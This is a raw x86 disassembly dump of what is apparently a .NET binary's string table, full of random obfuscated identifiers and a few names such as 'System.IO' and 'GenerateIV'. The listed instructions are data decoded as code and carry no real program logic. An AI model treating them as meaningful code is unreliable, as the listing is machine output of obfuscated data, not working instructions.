  407bb5:	00 5a 48             	add    %bl,0x48(%edx)
  407bb8:	73 7a                	jae    0x407c34
  407bba:	43                   	inc    %ebx
  407bbb:	7a 66                	jp     0x407c23
  407bbd:	52                   	push   %edx
  407bbe:	4b                   	dec    %ebx
  407bbf:	59                   	pop    %ecx
  407bc0:	43                   	inc    %ebx
  407bc1:	6c                   	insb   (%dx),%es:(%edi)
  407bc2:	4e                   	dec    %esi
  407bc3:	4a                   	dec    %edx
  407bc4:	00 76 64             	add    %dh,0x64(%esi)
  407bc7:	4f                   	dec    %edi
  407bc8:	57                   	push   %edi
  407bc9:	6d                   	insl   (%dx),%es:(%edi)
  407bca:	54                   	push   %esp
  407bcb:	67 75 53             	addr16 jne 0x407c21
  407bce:	58                   	pop    %eax
  407bcf:	51                   	push   %ecx
  407bd0:	4a                   	dec    %edx
  407bd1:	00 72 47             	add    %dh,0x47(%edx)
  407bd4:	4e                   	dec    %esi
  407bd5:	6e                   	outsb  %ds:(%esi),(%dx)
  407bd6:	63 45 63             	arpl   %eax,0x63(%ebp)
  407bd9:	69 67 64 6f 69 76 70 	imul   $0x7076696f,0x64(%edi),%esp
  407be0:	6e                   	outsb  %ds:(%esi),(%dx)
  407be1:	5a                   	pop    %edx
  407be2:	4a                   	dec    %edx
  407be3:	00 77 7a             	add    %dh,0x7a(%edi)
  407be6:	43                   	inc    %ebx
  407be7:	68 66 50 66 5a       	push   $0x5a665066
  407bec:	66 4a                	dec    %dx
  407bee:	00 61 69             	add    %ah,0x69(%ecx)
  407bf1:	69 65 66 6b 67 62 66 	imul   $0x6662676b,0x66(%ebp),%esp
  407bf8:	50                   	push   %eax
  407bf9:	67 4e                	addr16 dec %esi
  407bfb:	43                   	inc    %ebx
  407bfc:	69 4a 00 44 72 51 61 	imul   $0x61517244,0x0(%edx),%ecx
  407c03:	61                   	popa
  407c04:	64 69 4d 78 55 70 4a 	imul   $0x4a7055,%fs:0x78(%ebp),%ecx
  407c0b:	00 
  407c0c:	46                   	inc    %esi
  407c0d:	71 78                	jno    0x407c87
  407c0f:	66 58                	pop    %ax
  407c11:	47                   	inc    %edi
  407c12:	65 6e                	outsb  %gs:(%esi),(%dx)
  407c14:	49                   	dec    %ecx
  407c15:	76 4a                	jbe    0x407c61
  407c17:	00 7a 56             	add    %bh,0x56(%edx)
  407c1a:	6e                   	outsb  %ds:(%esi),(%dx)
  407c1b:	6a 53                	push   $0x53
  407c1d:	47                   	inc    %edi
  407c1e:	63 44 47 42          	arpl   %eax,0x42(%edi,%eax,2)
  407c22:	4b                   	dec    %ebx
  407c23:	00 5a 77             	add    %bl,0x77(%edx)
  407c26:	4b                   	dec    %ebx
  407c27:	46                   	inc    %esi
  407c28:	4c                   	dec    %esp
  407c29:	48                   	dec    %eax
  407c2a:	70 56                	jo     0x407c82
  407c2c:	73 5a                	jae    0x407c88
  407c2e:	6b 46 4b 00          	imul   $0x0,0x4b(%esi),%eax
  407c32:	78 4d                	js     0x407c81
  407c34:	49                   	dec    %ecx
  407c35:	51                   	push   %ecx
  407c36:	63 6e 68             	arpl   %ebp,0x68(%esi)
  407c39:	4e                   	dec    %esi
  407c3a:	57                   	push   %edi
  407c3b:	52                   	push   %edx
  407c3c:	4c                   	dec    %esp
  407c3d:	4b                   	dec    %ebx
  407c3e:	00 51 65             	add    %dl,0x65(%ecx)
  407c41:	76 49                	jbe    0x407c8c
  407c43:	51                   	push   %ecx
  407c44:	71 77                	jno    0x407cbd
  407c46:	6b 5a 6a 4f          	imul   $0x4f,0x6a(%edx),%ebx
  407c4a:	4b                   	dec    %ebx
  407c4b:	00 68 62             	add    %ch,0x62(%eax)
  407c4e:	47                   	inc    %edi
  407c4f:	52                   	push   %edx
  407c50:	65 46                	gs inc %esi
  407c52:	4f                   	dec    %edi
  407c53:	41                   	inc    %ecx
  407c54:	66 7a 6c             	data16 jp 0x407cc3
  407c57:	74 76                	je     0x407ccf
  407c59:	48                   	dec    %eax
  407c5a:	50                   	push   %eax
  407c5b:	4b                   	dec    %ebx
  407c5c:	00 68 6a             	add    %ch,0x6a(%eax)
  407c5f:	70 57                	jo     0x407cb8
  407c61:	7a 73                	jp     0x407cd6
  407c63:	49                   	dec    %ecx
  407c64:	61                   	popa
  407c65:	74 73                	je     0x407cda
  407c67:	41                   	inc    %ecx
  407c68:	48                   	dec    %eax
  407c69:	52                   	push   %edx
  407c6a:	4b                   	dec    %ebx
  407c6b:	00 45 64             	add    %al,0x64(%ebp)
  407c6e:	47                   	inc    %edi
  407c6f:	66 76 75             	data16 jbe 0x407ce7
  407c72:	71 64                	jno    0x407cd8
  407c74:	73 55                	jae    0x407ccb
  407c76:	76 66                	jbe    0x407cde
  407c78:	54                   	push   %esp
  407c79:	4b                   	dec    %ebx
  407c7a:	00 58 41             	add    %bl,0x41(%eax)
  407c7d:	6a 51                	push   $0x51
  407c7f:	72 61                	jb     0x407ce2
  407c81:	43                   	inc    %ebx
  407c82:	57                   	push   %edi
  407c83:	69 55 4b 00 4b 61 56 	imul   $0x56614b00,0x4b(%ebp),%edx
  407c8a:	75 53                	jne    0x407cdf
  407c8c:	71 6b                	jno    0x407cf9
  407c8e:	58                   	pop    %eax
  407c8f:	48                   	dec    %eax
  407c90:	41                   	inc    %ecx
  407c91:	66 65 4b             	gs dec %bx
  407c94:	00 6a 6a             	add    %ch,0x6a(%edx)
  407c97:	62 71 54             	bound  %esi,0x54(%ecx)
  407c9a:	71 46                	jno    0x407ce2
  407c9c:	67 62 67 4b          	bound  %esp,0x4b(%bx)
  407ca0:	00 42 7a             	add    %al,0x7a(%edx)
  407ca3:	4d                   	dec    %ebp
  407ca4:	66 74 43             	data16 je 0x407cea
  407ca7:	48                   	dec    %eax
  407ca8:	50                   	push   %eax
  407ca9:	45                   	inc    %ebp
  407caa:	6e                   	outsb  %ds:(%esi),(%dx)
  407cab:	4b                   	dec    %ebx
  407cac:	00 67 55             	add    %ah,0x55(%edi)
  407caf:	67 52                	addr16 push %edx
  407cb1:	62 78 78             	bound  %edi,0x78(%eax)
  407cb4:	59                   	pop    %ecx
  407cb5:	62 59 41             	bound  %ebx,0x41(%ecx)
  407cb8:	4c                   	dec    %esp
  407cb9:	00 4e 50             	add    %cl,0x50(%esi)
  407cbc:	58                   	pop    %eax
  407cbd:	6b 72 45 45          	imul   $0x45,0x45(%edx),%esi
  407cc1:	54                   	push   %esp
  407cc2:	4a                   	dec    %edx
  407cc3:	4c                   	dec    %esp
  407cc4:	00 6c 68 66          	add    %ch,0x66(%eax,%ebp,2)
  407cc8:	68 66 50 69 73       	push   $0x73695066
  407ccd:	53                   	push   %ebx
  407cce:	52                   	push   %edx
  407ccf:	54                   	push   %esp
  407cd0:	4c                   	dec    %esp
  407cd1:	00 54 6a 6a          	add    %dl,0x6a(%edx,%ebp,2)
  407cd5:	70 73                	jo     0x407d4a
  407cd7:	42                   	inc    %edx
  407cd8:	57                   	push   %edi
  407cd9:	4e                   	dec    %esi
  407cda:	47                   	inc    %edi
  407cdb:	47                   	inc    %edi
  407cdc:	78 50                	js     0x407d2e
  407cde:	41                   	inc    %ecx
  407cdf:	44                   	inc    %esp
  407ce0:	4d                   	dec    %ebp
  407ce1:	00 42 42             	add    %al,0x42(%edx)
  407ce4:	68 42 44 73 6a       	push   $0x6a734442
  407ce9:	4a                   	dec    %edx
  407cea:	78 52                	js     0x407d3e
  407cec:	48                   	dec    %eax
  407ced:	66 48                	dec    %ax
  407cef:	4d                   	dec    %ebp
  407cf0:	00 72 55             	add    %dh,0x55(%edx)
  407cf3:	72 47                	jb     0x407d3c
  407cf5:	4f                   	dec    %edi
  407cf6:	65 4e                	gs dec %esi
  407cf8:	65 41                	gs inc %ecx
  407cfa:	79 55                	jns    0x407d51
  407cfc:	62 4e 4d             	bound  %ecx,0x4d(%esi)
  407cff:	00 41 71             	add    %al,0x71(%ecx)
  407d02:	6d                   	insl   (%dx),%es:(%edi)
  407d03:	56                   	push   %esi
  407d04:	76 54                	jbe    0x407d5a
  407d06:	61                   	popa
  407d07:	55                   	push   %ebp
  407d08:	6b 57 51 4d          	imul   $0x4d,0x51(%edi),%edx
  407d0c:	00 52 4c             	add    %dl,0x4c(%edx)
  407d0f:	48                   	dec    %eax
  407d10:	45                   	inc    %ebp
  407d11:	45                   	inc    %ebp
  407d12:	78 79                	js     0x407d8d
  407d14:	6a 7a                	push   $0x7a
  407d16:	63 4b 52             	arpl   %ecx,0x52(%ebx)
  407d19:	4b                   	dec    %ebx
  407d1a:	4e                   	dec    %esi
  407d1b:	58                   	pop    %eax
  407d1c:	4d                   	dec    %ebp
  407d1d:	00 72 5a             	add    %dh,0x5a(%edx)
  407d20:	4e                   	dec    %esi
  407d21:	62 56 4f             	bound  %edx,0x4f(%esi)
  407d24:	52                   	push   %edx
  407d25:	54                   	push   %esp
  407d26:	77 5a                	ja     0x407d82
  407d28:	64 4d                	fs dec %ebp
  407d2a:	00 4f 64             	add    %cl,0x64(%edi)
  407d2d:	4e                   	dec    %esi
  407d2e:	44                   	inc    %esp
  407d2f:	48                   	dec    %eax
  407d30:	71 43                	jno    0x407d75
  407d32:	67 48                	addr16 dec %eax
  407d34:	42                   	inc    %edx
  407d35:	4f                   	dec    %edi
  407d36:	69 4d 00 4e 65 4a 78 	imul   $0x784a654e,0x0(%ebp),%ecx
  407d3d:	43                   	inc    %ebx
  407d3e:	44                   	inc    %esp
  407d3f:	69 5a 62 61 42 46 71 	imul   $0x71464261,0x62(%edx),%ebx
  407d46:	6c                   	insb   (%dx),%es:(%edi)
  407d47:	4d                   	dec    %ebp
  407d48:	00 6b 6f             	add    %ch,0x6f(%ebx)
  407d4b:	64 4d                	fs dec %ebp
  407d4d:	67 6e                	outsb  %ds:(%si),(%dx)
  407d4f:	6d                   	insl   (%dx),%es:(%edi)
  407d50:	6c                   	insb   (%dx),%es:(%edi)
  407d51:	6c                   	insb   (%dx),%es:(%edi)
  407d52:	6b 6c 72 4d 00       	imul   $0x0,0x4d(%edx,%esi,2),%ebp
  407d57:	49                   	dec    %ecx
  407d58:	7a 78                	jp     0x407dd2
  407d5a:	4d                   	dec    %ebp
  407d5b:	56                   	push   %esi
  407d5c:	47                   	inc    %edi
  407d5d:	4f                   	dec    %edi
  407d5e:	4e                   	dec    %esi
  407d5f:	78 4d                	js     0x407dae
  407d61:	00 69 71             	add    %ch,0x71(%ecx)
  407d64:	63 65 77             	arpl   %esp,0x77(%ebp)
  407d67:	45                   	inc    %ebp
  407d68:	41                   	inc    %ecx
  407d69:	57                   	push   %edi
  407d6a:	44                   	inc    %esp
  407d6b:	43                   	inc    %ebx
  407d6c:	49                   	dec    %ecx
  407d6d:	79 76                	jns    0x407de5
  407d6f:	4a                   	dec    %edx
  407d70:	4e                   	dec    %esi
  407d71:	00 57 4f             	add    %dl,0x4f(%edi)
  407d74:	6d                   	insl   (%dx),%es:(%edi)
  407d75:	4e                   	dec    %esi
  407d76:	52                   	push   %edx
  407d77:	64 50                	fs push %eax
  407d79:	52                   	push   %edx
  407d7a:	51                   	push   %ecx
  407d7b:	73 5a                	jae    0x407dd7
  407d7d:	4b                   	dec    %ebx
  407d7e:	4e                   	dec    %esi
  407d7f:	00 4f 4a             	add    %cl,0x4a(%edi)
  407d82:	53                   	push   %ebx
  407d83:	69 61 67 44 79 58 46 	imul   $0x46587944,0x67(%ecx),%esp
  407d8a:	69 4e 4e 00 6d 73 58 	imul   $0x58736d00,0x4e(%esi),%ecx
  407d91:	4b                   	dec    %ebx
  407d92:	71 44                	jno    0x407dd8
  407d94:	6a 63                	push   $0x63
  407d96:	4d                   	dec    %ebp
  407d97:	4f                   	dec    %edi
  407d98:	4e                   	dec    %esi
  407d99:	00 71 6d             	add    %dh,0x6d(%ecx)
  407d9c:	4e                   	dec    %esi
  407d9d:	50                   	push   %eax
  407d9e:	79 4d                	jns    0x407ded
  407da0:	41                   	inc    %ecx
  407da1:	66 58                	pop    %ax
  407da3:	47                   	inc    %edi
  407da4:	6c                   	insb   (%dx),%es:(%edi)
  407da5:	43                   	inc    %ebx
  407da6:	54                   	push   %esp
  407da7:	53                   	push   %ebx
  407da8:	4e                   	dec    %esi
  407da9:	00 6c 72 70          	add    %ch,0x70(%edx,%esi,2)
  407dad:	4d                   	dec    %ebp
  407dae:	43                   	inc    %ebx
  407daf:	74 7a                	je     0x407e2b
  407db1:	58                   	pop    %eax
  407db2:	7a 49                	jp     0x407dfd
  407db4:	54                   	push   %esp
  407db5:	4e                   	dec    %esi
  407db6:	00 66 42             	add    %ah,0x42(%esi)
  407db9:	6a 46                	push   $0x46
  407dbb:	43                   	inc    %ebx
  407dbc:	65 6c                	gs insb (%dx),%es:(%edi)
  407dbe:	4c                   	dec    %esp
  407dbf:	6c                   	insb   (%dx),%es:(%edi)
  407dc0:	74 56                	je     0x407e18
  407dc2:	4e                   	dec    %esi
  407dc3:	59                   	pop    %ecx
  407dc4:	4e                   	dec    %esi
  407dc5:	00 5a 54             	add    %bl,0x54(%edx)
  407dc8:	67 75 4c             	addr16 jne 0x407e17
  407dcb:	68 45 6a 45 49       	push   $0x49456a45
  407dd0:	48                   	dec    %eax
  407dd1:	6d                   	insl   (%dx),%es:(%edi)
  407dd2:	6f                   	outsl  %ds:(%esi),(%dx)
  407dd3:	4e                   	dec    %esi
  407dd4:	00 52 55             	add    %dl,0x55(%edx)
  407dd7:	75 71                	jne    0x407e4a
  407dd9:	56                   	push   %esi
  407dda:	63 52 54             	arpl   %edx,0x54(%edx)
  407ddd:	77 52                	ja     0x407e31
  407ddf:	52                   	push   %edx
  407de0:	76 47                	jbe    0x407e29
  407de2:	4f                   	dec    %edi
  407de3:	00 53 79             	add    %dl,0x79(%ebx)
  407de6:	73 74                	jae    0x407e5c
  407de8:	65 6d                	gs insl (%dx),%es:(%edi)
  407dea:	2e 49                	cs dec %ecx
  407dec:	4f                   	dec    %edi
  407ded:	00 56 62             	add    %dl,0x62(%esi)
  407df0:	45                   	inc    %ebp
  407df1:	59                   	pop    %ecx
  407df2:	51                   	push   %ecx
  407df3:	47                   	inc    %edi
  407df4:	46                   	inc    %esi
  407df5:	4b                   	dec    %ebx
  407df6:	4e                   	dec    %esi
  407df7:	57                   	push   %edi
  407df8:	44                   	inc    %esp
  407df9:	4b                   	dec    %ebx
  407dfa:	4f                   	dec    %edi
  407dfb:	00 47 6b             	add    %al,0x6b(%edi)
  407dfe:	41                   	inc    %ecx
  407dff:	46                   	inc    %esi
  407e00:	46                   	inc    %esi
  407e01:	64 47                	fs inc %edi
  407e03:	63 70 45             	arpl   %esi,0x45(%eax)
  407e06:	56                   	push   %esi
  407e07:	55                   	push   %ebp
  407e08:	56                   	push   %esi
  407e09:	4f                   	dec    %edi
  407e0a:	00 76 58             	add    %dh,0x58(%esi)
  407e0d:	4c                   	dec    %esp
  407e0e:	52                   	push   %edx
  407e0f:	4b                   	dec    %ebx
  407e10:	62 76 69             	bound  %esi,0x69(%esi)
  407e13:	5a                   	pop    %edx
  407e14:	4e                   	dec    %esi
  407e15:	59                   	pop    %ecx
  407e16:	5a                   	pop    %edx
  407e17:	4f                   	dec    %edi
  407e18:	00 68 6e             	add    %ch,0x6e(%eax)
  407e1b:	5a                   	pop    %edx
  407e1c:	58                   	pop    %eax
  407e1d:	4d                   	dec    %ebp
  407e1e:	44                   	inc    %esp
  407e1f:	73 63                	jae    0x407e84
  407e21:	72 67                	jb     0x407e8a
  407e23:	49                   	dec    %ecx
  407e24:	69 4b 4d 71 4f 00 41 	imul   $0x41004f71,0x4d(%ebx),%ecx
  407e2b:	56                   	push   %esi
  407e2c:	4a                   	dec    %edx
  407e2d:	52                   	push   %edx
  407e2e:	44                   	inc    %esp
  407e2f:	50                   	push   %eax
  407e30:	42                   	inc    %edx
  407e31:	48                   	dec    %eax
  407e32:	6e                   	outsb  %ds:(%esi),(%dx)
  407e33:	66 52                	push   %dx
  407e35:	63 49 57             	arpl   %ecx,0x57(%ecx)
  407e38:	46                   	inc    %esi
  407e39:	50                   	push   %eax
  407e3a:	00 6e 46             	add    %ch,0x46(%esi)
  407e3d:	4d                   	dec    %ebp
  407e3e:	71 6a                	jno    0x407eaa
  407e40:	47                   	inc    %edi
  407e41:	48                   	dec    %eax
  407e42:	45                   	inc    %ebp
  407e43:	6f                   	outsl  %ds:(%esi),(%dx)
  407e44:	50                   	push   %eax
  407e45:	75 54                	jne    0x407e9b
  407e47:	54                   	push   %esp
  407e48:	50                   	push   %eax
  407e49:	00 7a 57             	add    %bh,0x57(%edx)
  407e4c:	71 52                	jno    0x407ea0
  407e4e:	51                   	push   %ecx
  407e4f:	79 66                	jns    0x407eb7
  407e51:	71 4b                	jno    0x407e9e
  407e53:	71 68                	jno    0x407ebd
  407e55:	50                   	push   %eax
  407e56:	00 6c 57 72          	add    %ch,0x72(%edi,%edx,2)
  407e5a:	79 6c                	jns    0x407ec8
  407e5c:	6c                   	insb   (%dx),%es:(%edi)
  407e5d:	43                   	inc    %ebx
  407e5e:	50                   	push   %eax
  407e5f:	55                   	push   %ebp
  407e60:	52                   	push   %edx
  407e61:	77 56                	ja     0x407eb9
  407e63:	59                   	pop    %ecx
  407e64:	76 50                	jbe    0x407eb6
  407e66:	00 59 46             	add    %bl,0x46(%ecx)
  407e69:	68 57 49 52 63       	push   $0x63524957
  407e6e:	72 43                	jb     0x407eb3
  407e70:	6b 63 51 6c          	imul   $0x6c,0x51(%ebx),%esp
  407e74:	6f                   	outsl  %ds:(%esi),(%dx)
  407e75:	44                   	inc    %esp
  407e76:	51                   	push   %ecx
  407e77:	00 41 48             	add    %al,0x48(%ecx)
  407e7a:	43                   	inc    %ebx
  407e7b:	4f                   	dec    %edi
  407e7c:	6c                   	insb   (%dx),%es:(%edi)
  407e7d:	53                   	push   %ebx
  407e7e:	4d                   	dec    %ebp
  407e7f:	44                   	inc    %esp
  407e80:	6f                   	outsl  %ds:(%esi),(%dx)
  407e81:	56                   	push   %esi
  407e82:	47                   	inc    %edi
  407e83:	6d                   	insl   (%dx),%es:(%edi)
  407e84:	4b                   	dec    %ebx
  407e85:	51                   	push   %ecx
  407e86:	00 56 6d             	add    %dl,0x6d(%esi)
  407e89:	5a                   	pop    %edx
  407e8a:	4e                   	dec    %esi
  407e8b:	72 41                	jb     0x407ece
  407e8d:	47                   	inc    %edi
  407e8e:	53                   	push   %ebx
  407e8f:	6c                   	insb   (%dx),%es:(%edi)
  407e90:	45                   	inc    %ebp
  407e91:	53                   	push   %ebx
  407e92:	51                   	push   %ecx
  407e93:	00 43 58             	add    %al,0x58(%ebx)
  407e96:	43                   	inc    %ebx
  407e97:	4c                   	dec    %esp
  407e98:	56                   	push   %esi
  407e99:	52                   	push   %edx
  407e9a:	68 45 6c 62 51       	push   $0x51626c45
  407e9f:	00 4e 7a             	add    %cl,0x7a(%esi)
  407ea2:	44                   	inc    %esp
  407ea3:	76 58                	jbe    0x407efd
  407ea5:	55                   	push   %ebp
  407ea6:	51                   	push   %ecx
  407ea7:	66 68 44 71          	pushw  $0x7144
  407eab:	65 51                	gs push %ecx
  407ead:	00 6c 49 6e          	add    %ch,0x6e(%ecx,%ecx,2)
  407eb1:	62 69 75             	bound  %ebp,0x75(%ecx)
  407eb4:	61                   	popa
  407eb5:	55                   	push   %ebp
  407eb6:	6c                   	insb   (%dx),%es:(%edi)
  407eb7:	61                   	popa
  407eb8:	56                   	push   %esi
  407eb9:	76 65                	jbe    0x407f20
  407ebb:	51                   	push   %ecx
  407ebc:	00 77 4a             	add    %dh,0x4a(%edi)
  407ebf:	71 6b                	jno    0x407f2c
  407ec1:	49                   	dec    %ecx
  407ec2:	78 48                	js     0x407f0c
  407ec4:	64 4a                	fs dec %edx
  407ec6:	68 48 68 51 00       	push   $0x516848
  407ecb:	79 57                	jns    0x407f24
  407ecd:	50                   	push   %eax
  407ece:	69 4c 61 78 70 4b 41 	imul   $0x55414b70,0x78(%ecx,%eiz,2),%ecx
  407ed5:	55 
  407ed6:	52                   	push   %edx
  407ed7:	00 76 74             	add    %dh,0x74(%esi)
  407eda:	44                   	inc    %esp
  407edb:	58                   	pop    %eax
  407edc:	55                   	push   %ebp
  407edd:	71 71                	jno    0x407f50
  407edf:	6a 52                	push   $0x52
  407ee1:	66 55                	push   %bp
  407ee3:	52                   	push   %edx
  407ee4:	00 79 71             	add    %bh,0x71(%ecx)
  407ee7:	65 41                	gs inc %ecx
  407ee9:	70 53                	jo     0x407f3e
  407eeb:	7a 54                	jp     0x407f41
  407eed:	7a 4c                	jp     0x407f3b
  407eef:	61                   	popa
  407ef0:	52                   	push   %edx
  407ef1:	00 7a 55             	add    %bh,0x55(%edx)
  407ef4:	4c                   	dec    %esp
  407ef5:	4b                   	dec    %ebx
  407ef6:	64 6c                	fs insb (%dx),%es:(%edi)
  407ef8:	6f                   	outsl  %ds:(%esi),(%dx)
  407ef9:	7a 70                	jp     0x407f6b
  407efb:	6d                   	insl   (%dx),%es:(%edi)
  407efc:	50                   	push   %eax
  407efd:	62 52 00             	bound  %edx,0x0(%edx)
  407f00:	76 78                	jbe    0x407f7a
  407f02:	61                   	popa
  407f03:	4b                   	dec    %ebx
  407f04:	52                   	push   %edx
  407f05:	50                   	push   %eax
  407f06:	57                   	push   %edi
  407f07:	6a 56                	push   $0x56
  407f09:	6b 6f 57 42          	imul   $0x42,0x57(%edi),%ebp
  407f0d:	53                   	push   %ebx
  407f0e:	00 75 56             	add    %dh,0x56(%ebp)
  407f11:	6d                   	insl   (%dx),%es:(%edi)
  407f12:	43                   	inc    %ebx
  407f13:	5a                   	pop    %edx
  407f14:	68 6d 62 4d 53       	push   $0x534d626d
  407f19:	00 74 68 69          	add    %dh,0x69(%eax,%ebp,2)
  407f1d:	64 4e                	fs dec %esi
  407f1f:	4b                   	dec    %ebx
  407f20:	73 66                	jae    0x407f88
  407f22:	66 41                	inc    %cx
  407f24:	76 66                	jbe    0x407f8c
  407f26:	70 72                	jo     0x407f9a
  407f28:	59                   	pop    %ecx
  407f29:	53                   	push   %ebx
  407f2a:	00 65 61             	add    %ah,0x61(%ebp)
  407f2d:	56                   	push   %esi
  407f2e:	54                   	push   %esp
  407f2f:	4b                   	dec    %ebx
  407f30:	73 79                	jae    0x407fab
  407f32:	73 4c                	jae    0x407f80
  407f34:	4d                   	dec    %ebp
  407f35:	61                   	popa
  407f36:	6d                   	insl   (%dx),%es:(%edi)
  407f37:	4b                   	dec    %ebx
  407f38:	63 53 00             	arpl   %edx,0x0(%ebx)
  407f3b:	63 72 42             	arpl   %esi,0x42(%edx)
  407f3e:	78 4a                	js     0x407f8a
  407f40:	78 7a                	js     0x407fbc
  407f42:	4b                   	dec    %ebx
  407f43:	4a                   	dec    %edx
  407f44:	54                   	push   %esp
  407f45:	6a 49                	push   $0x49
  407f47:	54                   	push   %esp
  407f48:	00 41 4c             	add    %al,0x4c(%ecx)
  407f4b:	6d                   	insl   (%dx),%es:(%edi)
  407f4c:	45                   	inc    %ebp
  407f4d:	6b 49 49 68          	imul   $0x68,0x49(%ecx),%ecx
  407f51:	6a 69                	push   $0x69
  407f53:	74 50                	je     0x407fa5
  407f55:	42                   	inc    %edx
  407f56:	51                   	push   %ecx
  407f57:	54                   	push   %esp
  407f58:	00 72 58             	add    %dh,0x58(%edx)
  407f5b:	4d                   	dec    %ebp
  407f5c:	4a                   	dec    %edx
  407f5d:	55                   	push   %ebp
  407f5e:	4f                   	dec    %edi
  407f5f:	50                   	push   %eax
  407f60:	50                   	push   %eax
  407f61:	47                   	inc    %edi
  407f62:	71 58                	jno    0x407fbc
  407f64:	58                   	pop    %eax
  407f65:	54                   	push   %esp
  407f66:	00 51 74             	add    %dl,0x74(%ecx)
  407f69:	43                   	inc    %ebx
  407f6a:	67 73 63             	addr16 jae 0x407fd0
  407f6d:	50                   	push   %eax
  407f6e:	76 6b                	jbe    0x407fdb
  407f70:	5a                   	pop    %edx
  407f71:	73 54                	jae    0x407fc7
  407f73:	00 6f 62             	add    %ch,0x62(%edi)
  407f76:	67 79 78             	addr16 jns 0x407ff1
  407f79:	4e                   	dec    %esi
  407f7a:	71 62                	jno    0x407fde
  407f7c:	6e                   	outsb  %ds:(%esi),(%dx)
  407f7d:	69 43 55 00 6c 55 76 	imul   $0x76556c00,0x55(%ebx),%eax
  407f84:	58                   	pop    %eax
  407f85:	44                   	inc    %esp
  407f86:	42                   	inc    %edx
  407f87:	65 77 70             	gs ja  0x407ffa
  407f8a:	41                   	inc    %ecx
  407f8b:	79 43                	jns    0x407fd0
  407f8d:	79 55                	jns    0x407fe4
  407f8f:	00 67 65             	add    %ah,0x65(%edi)
  407f92:	74 5f                	je     0x407ff3
  407f94:	49                   	dec    %ecx
  407f95:	56                   	push   %esi
  407f96:	00 73 65             	add    %dh,0x65(%ebx)
  407f99:	74 5f                	je     0x407ffa
  407f9b:	49                   	dec    %ecx
  407f9c:	56                   	push   %esi
  407f9d:	00 47 65             	add    %al,0x65(%edi)
  407fa0:	6e                   	outsb  %ds:(%esi),(%dx)
  407fa1:	65 72 61             	gs jb  0x408005
  407fa4:	74 65                	je     0x40800b
  407fa6:	49                   	dec    %ecx
  407fa7:	56                   	push   %esi
  407fa8:	00 6a 4e             	add    %ch,0x4e(%edx)
  407fab:	65 66 5a             	gs pop %dx
  407fae:	70 55                	jo     0x408005
  407fb0:	59                   	pop    %ecx
  407fb1:	67 59                	addr16 pop %ecx
  407fb3:	74 67                	je     0x40801c
  407fb5:	56                   	push   %esi
  407fb6:	00 62 62             	add    %ah,0x62(%edx)
  407fb9:	42                   	inc    %edx
  407fba:	4f                   	dec    %edi
  407fbb:	4f                   	dec    %edi
  407fbc:	4c                   	dec    %esp
  407fbd:	78 4d                	js     0x40800c
  407fbf:	65 42                	gs inc %edx
  407fc1:	4f                   	dec    %edi
  407fc2:	57                   	push   %edi
  407fc3:	7a 67                	jp     0x40802c
  407fc5:	56                   	push   %esi
  407fc6:	00 57 44             	add    %dl,0x44(%edi)
  407fc9:	7a 4c                	jp     0x408017
  407fcb:	78 4a                	js     0x408017
  407fcd:	51                   	push   %ecx
  407fce:	49                   	dec    %ecx
  407fcf:	46                   	inc    %esi
  407fd0:	4b                   	dec    %ebx
  407fd1:	6a 56                	push   $0x56
  407fd3:	00 65 48             	add    %ah,0x48(%ebp)
  407fd6:	42                   	inc    %edx
  407fd7:	74 4e                	je     0x408027
  407fd9:	74 41                	je     0x40801c
  407fdb:	6a 76                	push   $0x76
  407fdd:	6c                   	insb   (%dx),%es:(%edi)
  407fde:	56                   	push   %esi
  407fdf:	00 44 68 4f          	add    %al,0x4f(%eax,%ebp,2)
  407fe3:	67 4d                	addr16 dec %ebp
  407fe5:	42                   	inc    %edx
  407fe6:	72 4d                	jb     0x408035
  407fe8:	50                   	push   %eax
  407fe9:	68 66 64 61 74       	push   $0x74616466
  407fee:	56                   	push   %esi
  407fef:	00 72 45             	add    %dh,0x45(%edx)
  407ff2:	46                   	inc    %esi
  407ff3:	54                   	push   %esp
  407ff4:	54                   	push   %esp
  407ff5:	7a 70                	jp     0x408067
  407ff7:	46                   	inc    %esi
  407ff8:	45                   	inc    %ebp
  407ff9:	77 56                	ja     0x408051
  407ffb:	00 42 72             	add    %al,0x72(%edx)
  407ffe:	6d                   	insl   (%dx),%es:(%edi)
  407fff:	72 74                	jb     0x408075
  408001:	67 6e                	outsb  %ds:(%si),(%dx)
  408003:	4a                   	dec    %edx
  408004:	57                   	push   %edi
  408005:	68 77 56 00 65       	push   $0x65005677
  40800a:	4d                   	dec    %ebp
  40800b:	58                   	pop    %eax
  40800c:	6d                   	insl   (%dx),%es:(%edi)
  40800d:	70 71                	jo     0x408080
  40800f:	7a 59                	jp     0x40806a
  408011:	42                   	inc    %edx
  408012:	43                   	inc    %ebx
  408013:	57                   	push   %edi
  408014:	00 48 44             	add    %cl,0x44(%eax)
  408017:	64 65 75 64          	fs gs jne 0x40807f
  40801b:	4c                   	dec    %esp
  40801c:	4e                   	dec    %esi
  40801d:	43                   	inc    %ebx
  40801e:	57                   	push   %edi
  40801f:	00 58 6a             	add    %bl,0x6a(%eax)
  408022:	45                   	inc    %ebp
  408023:	5a                   	pop    %edx
  408024:	57                   	push   %edi
  408025:	75 66                	jne    0x40808d
  408027:	6d                   	insl   (%dx),%es:(%edi)
  408028:	58                   	pop    %eax
  408029:	58                   	pop    %eax
  40802a:	6c                   	insb   (%dx),%es:(%edi)
  40802b:	4b                   	dec    %ebx
  40802c:	57                   	push   %edi
  40802d:	00 4f 45             	add    %cl,0x45(%edi)
  408030:	6f                   	outsl  %ds:(%esi),(%dx)
  408031:	62 54 4a 66          	bound  %edx,0x66(%edx,%ecx,2)
  408035:	74 5a                	je     0x408091
  408037:	4e                   	dec    %esi
  408038:	6e                   	outsb  %ds:(%esi),(%dx)
  408039:	55                   	push   %ebp
  40803a:	63 6e 4d             	arpl   %ebp,0x4d(%esi)
  40803d:	57                   	push   %edi
  40803e:	00 4c 4f 6f          	add    %cl,0x6f(%edi,%ecx,2)
  408042:	58                   	pop    %eax
  408043:	6f                   	outsl  %ds:(%esi),(%dx)
  408044:	54                   	push   %esp
  408045:	78 65                	js     0x4080ac
  408047:	69 73 75 4d 4e 57 00 	imul   $0x574e4d,0x75(%ebx),%esi
  40804e:	4f                   	dec    %edi
  40804f:	78 63                	js     0x4080b4
  408051:	71 54                	jno    0x4080a7
  408053:	6c                   	insb   (%dx),%es:(%edi)
  408054:	73 54                	jae    0x4080aa
  408056:	50                   	push   %eax
  408057:	51                   	push   %ecx
  408058:	57                   	push   %edi
  408059:	00 5a 52             	add    %bl,0x52(%edx)
  40805c:	66 51                	push   %cx
  40805e:	69 51 51 72 42 56 57 	imul   $0x57564272,0x51(%ecx),%edx
